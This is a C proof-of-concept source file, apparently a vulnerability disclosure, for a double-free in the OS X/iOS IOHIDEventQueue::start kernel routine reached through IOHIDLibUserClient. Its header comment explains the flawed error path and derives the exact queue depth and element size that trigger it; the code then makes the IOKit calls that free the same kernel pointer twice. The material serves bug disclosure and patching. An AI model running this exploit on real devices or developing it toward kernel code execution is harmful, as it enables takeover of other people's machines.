// ianbeer
/*
clang -o hidlib_double_free hidlib_double_free.c -framework IOKit


iOS and OS X kernel code execution via double-delete in IOHIDEventQueue::start due to incorrect error handling

The IOHIDLibUserClient allows us to create and manage IOHIDEventQueues corrisponding to available HID devices.

Here is the ::start method, which can be reached via the IOHIDLibUserClient::_startQueue external method:

************ SNIP **************

void IOHIDEventQueue::start() 
{
    if ( _lock )
        IOLockLock(_lock);

    if ( _state & kHIDQueueStarted )
        goto START_END;

    if ( _currentEntrySize != _maxEntrySize )   <--- (a)
    {
        mach_port_t port = notifyMsg ? ((mach_msg_header_t *)notifyMsg)->msgh_remote_port : MACH_PORT_NULL;
        
        // Free the existing queue data
        if (dataQueue) {                   <-- (b)
            IOFreeAligned(dataQueue, round_page_32(getQueueSize() + DATA_QUEUE_MEMORY_HEADER_SIZE));
        }
        
        if (_descriptor) {
            _descriptor->release();
            _descriptor = 0;
        }
        
        // init the queue again.  This will allocate the appropriate data.
        if ( !initWithEntries(_numEntries, _maxEntrySize) ) {      (c) <----
            goto START_END;
        }
        
        _currentEntrySize = _maxEntrySize;
        
        // RY: since we are initing the queue, we should reset the port as well
        if ( port ) 
            setNotificationPort(port);
    }
    else if ( dataQueue )
    {
        dataQueue->head = 0;
        dataQueue->tail = 0;
    }

    _state |= kHIDQueueStarted;

START_END:
    if ( _lock )
        IOLockUnlock(_lock);

}

************ SNIP **************


If _currentEntrySize is not equal to _maxEntrySize then the start method will attempt to reallocate a better-sized queue;
if dataQueue (a member of IODataQueue) is non-zero its free'd then initWithEntries is called with the new _maxEntrySize.

Note that the error path on failure here jumps straight to the end of the function, so it's up to initWithEntries to
clear dataQueue if it fails:


************ SNIP **************

Boolean IOHIDEventQueue::initWithEntries(UInt32 numEntries, UInt32 entrySize)
{
    UInt32 size = numEntries*entrySize;
    
    if ( size < MIN_HID_QUEUE_CAPACITY )
        size = MIN_HID_QUEUE_CAPACITY;
        
    return super::initWithCapacity(size);
}

************ SNIP **************


There's a possible overflow here; but there will be *many* possible overflows coming up and we need to overflow at the right one...

This calls through to IOSharedDataQueue::initWithCapacity


************ SNIP **************

Boolean IOSharedDataQueue::initWithCapacity(UInt32 size)
{
    IODataQueueAppendix *   appendix;
    vm_size_t               allocSize;

    if (!super::init()) {
        return false;
    }

    _reserved = (ExpansionData *)IOMalloc(sizeof(struct ExpansionData));
    if (!_reserved) {
        return false;
    }

    if (size > UINT32_MAX - DATA_QUEUE_MEMORY_HEADER_SIZE - DATA_QUEUE_MEMORY_APPENDIX_SIZE) {
        return false;
    }
    
    allocSize = round_page(size + DATA_QUEUE_MEMORY_HEADER_SIZE + DATA_QUEUE_MEMORY_APPENDIX_SIZE);

    if (allocSize < size) {
        return false;
    }

    dataQueue = (IODataQueueMemory *)IOMallocAligned(allocSize, PAGE_SIZE);

************ SNIP **************


We need this function to fail on any of the first four conditions; if we reach the IOMallocAligned call
then dataQueue will either be set to a valid allocation (which is uninteresting) or set to NULL (also uninteresting.)

We probably can't fail the ::init() call nor the small IOMalloc. There are then two integer overflow checks;
the first will only fail if size (a UInt32 is greater than 0xfffffff4), and the second will be impossible to trigger on 64-bit since
round_pages will be checking for 64-bit overflow, and we want a cross-platform exploit!

Therefore, we have to reach the call to initWithCapacity with a size >= 0xfffffff4 (ie 12 possible values?)

Where do _maxEntrySize and _currentEntrySize come from?

When the queue is created they are both set to 0x20, and we can partially control _maxEntrySize by adding an new HIDElement to the queue.

_numEntries is a completely controlled dword.

So in order to reach the exploitable conditions we need to:

1) create a queue, specifying a value for _numEntries. This will allocate a queue (via initWithCapacity) of _numEntries*0x20; this allocation must succeed.

2) add an element to that queue with a *larger* size, such that _maxEntrySize is increased to NEW_MAX_SIZE.

3) stop the queue.

4) start the queue; at which point we will call IOHIDEventQueue::start. since _maxEntrySize is now larger this
will free dataQueue then call initWithEntries(_num_entries, NEW_MAX_SIZE). This has to fail in exactly the manner
described above such that dataQueue is a dangling pointer.

5) start the queue again, since _maxEntrySize is still != _currentEntrySize, this will call free dataQueue again!


The really tricky part here is coming up with the values for _numEntries and NEW_MAX_SIZE; the constraints are:

_numEntries is a dword
(_numEntries*0x20)%2^32 must be an allocatable size (ideally <0x10000000)
(_numEntries*NEW_MAX_SIZE)%2^32 must be >= 0xfffffff4

presumable NEW_MAX_SIZE is also reasonably limited by the HID descriptor parsing code, but I didn't look.

This really doesn't give you much leaway, but it is quite satisfiable :)

In this case I've chosen to create a "fake" hid device so that I can completely control NEW_MAX_SIZE, thus the PoC requires
root (as did the TAIG jailbreak which also messed with report descriptors.) However, this isn't actually a requirement to hit the bug; you'd just need to look through every single HID report descriptor on your system to find one with a suitable report size.

In this case, _numEntries of 0x3851eb85 leads to an initial queue size of (0x3851eb85*0x20)%2^32 = 0xa3d70a0
which is easily allocatable, and NEW_MAX_SIZE = 0x64 leads to: (0x3851eb85*0x64)%2^32 = 0xfffffff4


To run the PoC:

1) unzip and build the fake_hid code and run 'test -k' as root; this will create an IOHIDUserDevice whose
cookie=2 IOHIDElementPrivate report size is 0x64.

2) build and run this file as a regular user.

3) see double free crash.

There's actually nothing limiting this to a double free, you could go on indefinitely free'ing the same pointer.

As I said before, this bug doesn't actually require root but it's just *much* easier to repro with it!

Testing on: MacBookAir5,2 10.10.5 14F27
Guess that this affects iOS too but haven't tested.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOHIDUserDevice");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }else{
    printf("got userclient connection: %x, type:%d\n", conn, 0);
  }
  
  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

    
  // create a queue

  inputScalar[0] = 0x0;     // flags
  inputScalar[1] = 0x3851eb85-1; // depth
  inputScalarCnt = 2;
  outputScalarCnt = 1;

  err = IOConnectCallMethod(
    conn,
    0x3, // create_queue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error creating queue: %x\n", err);
    return 0;
  }

  // get the id of that queue

  uint32_t qid = outputScalar[0];
  printf("created queue id: 0x%x\n", qid);



  // map the elementValues
  // (calls getMemoryWithCurrentElementValues and maps an array of IOHIDElementValues into userspace)
    
  mach_vm_address_t addr = 0x4100000000;
  mach_vm_size_t size = 0x1000;
  uint32_t* buf = 0;

  err = IOConnectMapMemory(conn, 0, mach_task_self(), &addr, &size, 0);
  if (err != KERN_SUCCESS){
    printf("IOConnectMapMemory failed:0x%x\n", err);
    return 0;
  }

  buf = (uint32_t*)addr;
  printf("mapped at: 0x%p size:0x%x\n", addr, size);

  for (int i = 0; i < size/4; i++){
    printf("0x%08x\n", buf[i]);
  }

  // get the cookie for the first element
  uint32_t cookie = buf[0];
  cookie = 2;

  // start the queue
  
  inputScalarCnt = 1;
  inputStructCnt = 0;
  outputScalarCnt = 0;
  outputStructCnt = 0;


  inputScalar[0] = qid;

  err = IOConnectCallMethod(
    conn,
    0x8, // startQueue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error starting queue: %x\n", err);
    return 0;
  }
  
  printf("started queue\n");


  // start the queue with the small one (cookie = 5)

  // add the element to the queue
  
  inputScalarCnt = 3;
  inputStructCnt = 0;
  outputScalarCnt = 1;
  outputStructCnt = 0;


  inputScalar[0] = qid;    // queue id
  inputScalar[1] = cookie; // cookie for the first element
  inputScalar[2] = 0;


  err = IOConnectCallMethod(
    conn,
    0x5, // addElementToQueue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error add first element to queue: %x\n", err);
    return 0;
  }
  
  printf("0x%x\n", outputScalar[0]);

  
  // then start event delivery of the bigger one, so that _maxEntrySize is different
#if 0
  inputScalarCnt = 3;
  inputStructCnt = 0;
  outputScalarCnt = 1;
  outputStructCnt = 0;

  cookie = 2; //40 bytes

  inputScalar[0] = qid;    // queue id
  inputScalar[1] = cookie; // cookie for the first element
  inputScalar[2] = 0;


  err = IOConnectCallMethod(
    conn,
    0x5, // addElementToQueue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error add second element to queue: %x\n", err);
    return 0;
  }
  
  printf("0x%x\n", outputScalar[0]);
#endif
  // then stop the queue

  inputScalarCnt = 1;
  inputStructCnt = 0;
  outputScalarCnt = 0;
  outputStructCnt = 0;


  inputScalar[0] = qid;    // queue id


  err = IOConnectCallMethod(
    conn,
    0x9, // stopQueue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error stop queue: %x\n", err);
    return 0;
  }

  // then start it, which will free the queue and fail to allocate a new one
  
  inputScalarCnt = 1;
  inputStructCnt = 0;
  outputScalarCnt = 0;
  outputStructCnt = 0;


  inputScalar[0] = qid;

  err = IOConnectCallMethod(
    conn,
    0x8, // startQueue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error starting queue: %x\n", err);
    printf("continuing\n");
  }
  
  printf("started queue\n");

  // then start it again, which will free the queue again
  inputScalarCnt = 1;
  inputStructCnt = 0;
  outputScalarCnt = 0;
  outputStructCnt = 0;


  inputScalar[0] = qid;

  err = IOConnectCallMethod(
    conn,
    0x8, // startQueue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error starting queue again: %x\n", err);
    printf("continuing\n");
  }
  
  printf("started queue\n");
  
  
  
  
  
  
  
  // overwrite the totalSize field of the IOHIDElementValue which is mapped into userspace
  // to trigger the integer overflow when it gets enqueued 
  //for(;;){
  //  buf[1] = 0xfffffffe;
  //}

  return 0;
}
